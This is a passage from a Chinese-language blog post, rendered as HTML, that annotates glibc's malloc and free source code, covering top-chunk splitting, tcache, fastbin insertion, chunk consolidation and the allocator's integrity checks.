av-&gt;top is treated as larger (and thus</span><br><span class="hljs-comment">         less well fitting) than any other available chunk since it can</span><br><span class="hljs-comment">         be extended to be as large as necessary (up to system</span><br><span class="hljs-comment">         limitations).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="hljs-comment">         MINSIZE) after initialization, so if it would otherwise be</span><br><span class="hljs-comment">         exhausted by current request, it is replenished. (The main</span><br><span class="hljs-comment">         reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="hljs-comment">         to put in fenceposts in sysmalloc.)</span><br><span class="hljs-comment">       */</span><br><br>    victim = av-&gt;top;<br>    size = chunksize(victim);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb + MINSIZE))<br>    &#123;<span class="hljs-comment">//如果top足够大, 就分割</span><br>        remainder_size = size - nb;<br>        remainder = chunk_at_offset(victim, nb);<br>        av-&gt;top = remainder;<br>        set_head(victim, nb | PREV_INUSE |<br>                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>        set_head(remainder, remainder_size | PREV_INUSE);<br><br>        check_malloced_chunk(av, victim, nb);<br>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>    <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">         here for all block sizes.  */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>    &#123;<span class="hljs-comment">//如果不够大且当前arena有fastchunk, 再次malloc_consolidate()等待下一次循环是否可行</span><br>        malloc_consolidate(av);<br>        <span class="hljs-comment">/* restore original bin index */</span><br>        <span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>            idx = smallbin_index(nb);<br>        <span class="hljs-keyword">else</span><br>            idx = largebin_index(nb);<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">       */</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<span class="hljs-comment">//啥都没有, 直接sysmalloc()增加topchunk,并且return跳出循环</span><br>        <span class="hljs-keyword">void</span> *p = sysmalloc(nb, av);<br>        <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>            alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="释放内存块"><a href="#释放内存块" class="headerlink" title="释放内存块"></a>释放内存块</h1><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __libc_free(<span class="hljs-keyword">void</span> *mem) &#123;<br>    mstate    ar_ptr;<br>    mchunkptr p; <span class="hljs-comment">/* chunk corresponding to mem */</span><br>    <span class="hljs-comment">// 判断是否有钩子函数 __free_hook</span><br>    <span class="hljs-keyword">void</span> (*hook)(<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) = atomic_forced_read(__free_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;<br>        (*hook)(mem, RETURN_ADDRESS(<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// free NULL没有作用</span><br>    <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>) <span class="hljs-comment">/* free(0) has no effect */</span><br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 将mem转换为chunk状态</span><br>    p = mem2chunk(mem);<br>    <span class="hljs-comment">// 如果该块内存是mmap得到的</span><br>    <span class="hljs-keyword">if</span> (chunk_is_mmapped(p)) <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>        <span class="hljs-comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span><br><span class="hljs-comment">       Dumped fake mmapped chunks do not affect the threshold.  */</span><br>        <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask(p) &gt; mp_.mmap_threshold &amp;&amp;<br>            chunksize_nomask(p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp;<br>            !DUMPED_MAIN_ARENA_CHUNK(p)) &#123;<br>            mp_.mmap_threshold = chunksize(p);<br>            mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                       mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>        munmap_chunk(p);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    MAYBE_INIT_TCACHE (); <span class="hljs-comment">//唯一的tcache</span><br>    <br>    <span class="hljs-comment">// 根据chunk获得分配区的指针</span><br>    ar_ptr = arena_for_chunk(p);<br>    <span class="hljs-comment">// 执行释放</span><br>    _int_free(ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><h3 id="变量定义-1"><a href="#变量定义-1" class="headerlink" title="变量定义"></a>变量定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-keyword">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br>  mfastbinptr *fb;             <span class="hljs-comment">/* associated fastbin */</span><br>  mchunkptr nextchunk;         <span class="hljs-comment">/* next contiguous chunk */</span><br>  INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">int</span> nextinuse;               <span class="hljs-comment">/* true if nextchunk is used */</span><br>  INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* size of previous contiguous chunk */</span><br>  mchunkptr bck;               <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr fwd;               <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">int</span> locked = <span class="hljs-number">0</span>;<br><br>  size = chunksize (p);<br></code></pre></td></tr></table></figure><h3 id="小检查-amp-tcache"><a href="#小检查-amp-tcache" class="headerlink" title="小检查 &amp; tcache"></a>小检查 &amp; tcache</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">       allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">       Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">       here by accident or by &quot;design&quot; from some intruder.  */</span><br>    <span class="hljs-comment">// 指针不能指向非法的地址, 必须小于等于-size，为什么？？？</span><br>    <span class="hljs-comment">// 指针必须得对齐，2*SIZE_SZ 这个对齐</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect((<span class="hljs-keyword">uintptr_t</span>) p &gt; (<span class="hljs-keyword">uintptr_t</span>) -size, <span class="hljs-number">0</span>) ||<br>        __builtin_expect(misaligned_chunk(p), <span class="hljs-number">0</span>)) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>        <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked) __libc_lock_unlock(av-&gt;mutex);<br>        malloc_printerr(check_action, errstr, chunk2mem(p), av);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span><br><span class="hljs-comment">       multiple of MALLOC_ALIGNMENT.  */</span><br>    <span class="hljs-comment">// 大小没有最小的chunk大，或者说，大小不是MALLOC_ALIGNMENT的整数倍</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size))) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    <span class="hljs-comment">// 检查该chunk是否处于使用状态，非调试状态下没有作用</span><br>    check_inuse_chunk(av, p);<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (size);<br><br>    <span class="hljs-keyword">if</span> (tcache<br>&amp;&amp; tc_idx &lt; mp_.tcache_bins<br>&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>      &#123;<br>tcache_put (p, tc_idx);<br><span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>其中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp;MALLOC_ALIGN_MASK) == 0)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> misaligned_chunk(p)                                                    \</span><br><span class="hljs-meta">    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span><br><span class="hljs-meta">     MALLOC_ALIGN_MASK)</span><br></code></pre></td></tr></table></figure><h3 id="on-fastbin"><a href="#on-fastbin" class="headerlink" title="on fastbin"></a>on fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If eligible, place chunk on a fastbin so it can be found</span><br><span class="hljs-comment">    and used quickly in malloc.</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast ())<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> TRIM_FASTBINS</span><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">bordering top into fastbins </span><br><span class="hljs-comment">      */</span><br>      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top) <span class="hljs-comment">//这个宏是在if语句里加上一条,意义是p不和top chunk相邻</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>      ) &#123;<br><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))<br>  &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (chunksize (chunk_at_offset (p, size))<br>     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      &#123;<br><span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">   of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">   after getting the lock.  */</span><br><span class="hljs-keyword">if</span> (have_lock<br>    || (&#123; assert (locked == <span class="hljs-number">0</span>);<br>  __libc_lock_lock (av-&gt;mutex);<br>  locked = <span class="hljs-number">1</span>;<br>  chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;<br>      &#125;))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><span class="hljs-keyword">if</span> (! have_lock)<br>  &#123;<br>    __libc_lock_unlock (av-&gt;mutex);<br>    locked = <span class="hljs-number">0</span>;<br>  &#125;<br>      &#125;<br><span class="hljs-comment">// 将chunk的mem部分全部设置为perturb_byte</span><br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br><span class="hljs-comment">// 设置fast chunk的标记位</span><br>    set_fastchunks(av);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> idx = fastbin_index(size);<br>    fb = &amp;fastbin (av, idx); <span class="hljs-comment">//取出fastbin头指针</span><br><br>    <span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>    <span class="hljs-comment">//多线程相关, 跳过</span><br>    mchunkptr old = *fb, old2;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> old_idx = ~<span class="hljs-number">0u</span>;<span class="hljs-comment">//不就是1 吗?</span><br>    <span class="hljs-keyword">do</span><br>      &#123;<br><span class="hljs-comment">/* Check that the top of the bin is not the record we are going to add</span><br><span class="hljs-comment">   (i.e., double free).  */</span><br><span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>  &#123; <span class="hljs-comment">//防止对 fast bin double free</span><br>    errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">   size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">   only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">   deallocated.  See use of OLD_IDX below for the actual check.  */</span><br><span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>  old_idx = fastbin_index(chunksize(old));<br>p-&gt;fd = old2 = old;<br>      &#125;<br>    <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);<br><br>    <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>))<br>      &#123;<br>errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h3 id="合并非-mmap-的空闲-chunk"><a href="#合并非-mmap-的空闲-chunk" class="headerlink" title="合并非 mmap 的空闲 chunk"></a>合并非 mmap 的空闲 chunk</h3><p><strong>只有不是 fast bin 的情况下才会触发 unlink</strong></p><p>首先我们先说一下为什么会合并 chunk，这是为了避免 heap 中有太多零零碎碎的内存块，合并之后可以用来应对更大的内存块请求。合并的主要顺序为</p><ul><li>先考虑物理低地址空闲块</li><li>后考虑物理高地址空闲块</li></ul><p><strong>合并后的 chunk 指向合并的 chunk 的低地址。</strong></p><p>在没有锁的情况下，先获得锁。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  Consolidate other non-mmapped chunks as they arrive.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>    <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>        __libc_lock_lock(av-&gt;mutex);<br>        locked = <span class="hljs-number">1</span>;<br>    &#125;<br>    nextchunk = chunk_at_offset(p, size);<br></code></pre></td></tr></table></figure><h4 id="轻量级的检测"><a href="#轻量级的检测" class="headerlink" title="轻量级的检测"></a>轻量级的检测</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Lightweight tests: check whether the block is already the</span><br><span class="hljs-comment">   top block.  */</span><br><span class="hljs-comment">// 当前free的chunk不能是top chunk</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely(p == av-&gt;top)) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 当前free的chunk的下一个chunk不能超过arena的边界</span><br><span class="hljs-comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span><br><span class="hljs-keyword">if</span> (__builtin_expect(contiguous(av) &amp;&amp;<br>                         (<span class="hljs-keyword">char</span> *) nextchunk &gt;=<br>                             ((<span class="hljs-keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)),<br>                     <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 当前要free的chunk的使用标记没有被标记，double free</span><br><span class="hljs-comment">/* Or whether the block is actually not marked used.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk))) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 下一个chunk的大小</span><br>nextsize = chunksize(nextchunk);<br><span class="hljs-comment">// next chunk size valid check</span><br><span class="hljs-comment">// 判断下一个chunk的大小是否不大于2*SIZE_SZ，或者</span><br><span class="hljs-comment">// nextsize是否大于系统可提供的内存</span><br><span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(nextchunk) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||<br>    __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="释放填充"><a href="#释放填充" class="headerlink" title="释放填充"></a>释放填充</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//将指针的mem部分全部设置为perturb_byte        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);</span><br></code></pre></td></tr></table></figure><h4 id="后向合并-合并低地址-chunk"><a href="#后向合并-合并低地址-chunk" class="headerlink" title="后向合并 - 合并低地址 chunk"></a>后向合并 - 合并低地址 chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span>        <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;            prevsize = prev_size(p);            size += prevsize;            p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));            unlink(av, p, bck, fwd);        &#125;<br></code></pre></td></tr></table></figure><h4 id="下一块不是-top-chunk-前向合并-合并高地址-chunk"><a href="#下一块不是-top-chunk-前向合并-合并高地址-chunk" class="headerlink" title="下一块不是 top chunk - 前向合并 - 合并高地址 chunk"></a>下一块不是 top chunk - 前向合并 - 合并高地址 chunk</h4><p>需要注意的是，如果下一块不是 top chunk ，则合并，并将合并后的 chunk 放入到 unsorted bin 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 如果下一个chunk不是top chunk</span><br><span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>    <span class="hljs-comment">/* get and clear inuse bit */</span><br>    <span class="hljs-comment">// 获取下一个 chunk 的使用状态</span><br>    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br>    <span class="hljs-comment">// 如果不在使用，合并，否则清空当前chunk的使用状态。</span><br>    <span class="hljs-comment">/* consolidate forward */</span><br>    <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>        unlink(av, nextchunk, bck, fwd);<br>        size += nextsize;<br>    &#125; <span class="hljs-keyword">else</span><br>        clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">  Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">  not placed into regular bins until after they have</span><br><span class="hljs-comment">  been given one chance to be used in malloc.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// 把 chunk 放在 unsorted chunk 链表的头部</span><br>    bck = unsorted_chunks(av);<br>    fwd = bck-&gt;fd;<br>    <span class="hljs-comment">// 简单的检查</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    p-&gt;fd = fwd;<br>    p-&gt;bk = bck;<br>    <span class="hljs-comment">// 如果是 large chunk，那就设置nextsize指针字段为NULL。</span><br>    <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>        p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>        p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    bck-&gt;fd = p;<br>    fwd-&gt;bk = p;<br><br>    set_head(p, size | PREV_INUSE);<br>    set_foot(p, size);<br><br>    check_free_chunk(av, p);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="下一块是-top-chunk-合并到-top-chunk"><a href="#下一块是-top-chunk-合并到-top-chunk" class="headerlink" title="下一块是 top chunk - 合并到 top chunk"></a>下一块是 top chunk - 合并到 top chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">  consolidate into top</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// 如果要释放的chunk的下一个chunk是top chunk，那就合并到 top chunk</span><br><span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>    check_chunk(av, p);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="向系统返还内存"><a href="#向系统返还内存" class="headerlink" title="向系统返还内存"></a>向系统返还内存</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If freeing a large space, consolidate possibly-surrounding</span><br><span class="hljs-comment">          chunks. Then, if the total unused topmost memory exceeds trim</span><br><span class="hljs-comment">          threshold, ask malloc_trim to reduce top.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          Unless max_fast is 0, 